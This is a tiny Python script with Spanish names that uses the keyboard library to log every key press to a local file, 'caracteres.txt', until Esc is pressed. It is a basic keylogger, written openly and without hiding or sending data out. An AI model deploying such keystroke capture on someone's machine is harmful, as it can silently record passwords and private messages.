import keyboard

def guardar(teclado):
    with open("caracteres.txt", "a") as f:
        f.write(f"{teclado.name}")

keyboard.on_press(guardar)
keyboard.wait('esc') 